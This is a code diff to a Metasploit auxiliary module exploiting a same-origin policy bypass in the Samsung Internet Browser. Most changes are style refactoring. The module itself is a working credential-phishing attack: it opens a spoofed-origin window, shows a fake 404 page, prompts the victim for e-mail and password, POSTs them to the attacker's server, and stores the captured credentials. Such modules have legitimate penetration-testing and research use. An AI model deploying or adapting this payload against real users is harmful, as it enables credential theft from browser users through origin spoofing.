@@ -10,7 +10,7 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name'           => "Samsung Internet Browser SOP Bypass",
+        'Name'           => 'Samsung Internet Browser SOP Bypass',
         'Description'    => %q(
           This module takes advantage of a Same-Origin Policy (SOP) bypass vulnerability in the
           Samsung Internet Browser, a popular mobile browser shipping with Samsung Android devices.
@@ -26,7 +26,7 @@ class MetasploitModule < Msf::Auxiliary
         'References'     => [
         ['URL', 'http://fr.0day.today/exploit/description/28434'],
         ],
-        'DisclosureDate' => "Nov 08 2017",
+        'DisclosureDate' => 'Nov 08 2017',
         'Actions'        => [[ 'WebServer' ]],
         'PassiveActions' => [ 'WebServer' ],
         'DefaultAction'  => 'WebServer'
@@ -36,14 +36,14 @@ class MetasploitModule < Msf::Auxiliary
   register_options([
       OptString.new('TARGET_URL', [
         true,
-        "The URL to spoof origin from.",
+        'The URL to spoof origin from.',
         'http://example.com/'
       ]),
       OptString.new('CUSTOM_HTML', [
         true,
-        "HTML to display to the victim.",
-        'This page has moved. Please <a href="#">click here</a> redirect your browser.'
-      ]),
+        'HTML to display to the victim.',
+        'This page has moved. Please <a href="#">click here</a> to redirect your browser.'
+      ])
     ])
 
   register_advanced_options([
@@ -61,35 +61,36 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def evil_javascript
-    if not datastore['CUSTOM_JS'].nil? and not datastore['CUSTOM_JS'].empty?
-      js = datastore['CUSTOM_JS']
-    else
-      js = <<-EOS
-        setTimeout(function(){
-          x.document.body.innerHTML='<h1>404 Error</h1>'+
-          '<p>Oops, something went wrong.</p>';
-          a=x.prompt('E-mail','');
-          b=x.prompt('Password','');
-          var cred=JSON.stringify({'user':a,'pass':b});
-          var xmlhttp = new XMLHttpRequest;
-            xmlhttp.open('POST', window.location, true);
-            xmlhttp.send(cred);
-          }, 3000);
-      EOS
-    end
-    return js
+    return datastore['CUSTOM_JS'] unless datastore['CUSTOM_JS'].blank?
+    js = <<-EOS
+      setTimeout(function(){
+        x.document.body.innerHTML='<h1>404 Error</h1>'+
+        '<p>Oops, something went wrong.</p>';
+        a=x.prompt('E-mail','');
+        b=x.prompt('Password','');
+        var cred=JSON.stringify({'user':a,'pass':b});
+        var xmlhttp = new XMLHttpRequest;
+          xmlhttp.open('POST', window.location, true);
+          xmlhttp.send(cred);
+        }, 3000);
+    EOS
+    js
   end
 
   def setup
     @html = <<-EOS
         <html>
         <meta charset="UTF-8">
+        <head>
         <script>
         function go(){
-          var x = window.open('#{datastore['TARGET_URL']}');
-          #{evil_javascript}
+          try {
+            var x = window.open('#{datastore['TARGET_URL']}');
+            #{evil_javascript}
+            } catch(e) { }
           }
         </script>
+        </head>
         <body onclick="go()">
         #{datastore['CUSTOM_HTML']}
         </body></html>
@@ -118,11 +119,11 @@ class MetasploitModule < Msf::Auxiliary
     cred = JSON.parse(request.body)
     u = cred['user']
     p = cred['pass']
-    if not u.nil? and not u.empty? and not p.nil? and not p.empty?
+    if u.blank? || p.blank?
+      print_good("#{cli.peerhost}: POST data received from #{datastore['TARGET_URL']}: #{request.body}")
+    else
       print_good("#{cli.peerhost}: Collected credential for '#{datastore['TARGET_URL']}' #{u}:#{p}")
       store_cred(u,p)
-    else
-      print_good("#{cli.peerhost}: POST data received from #{datastore['TARGET_URL']}: #{request.body}")
     end
   end
 
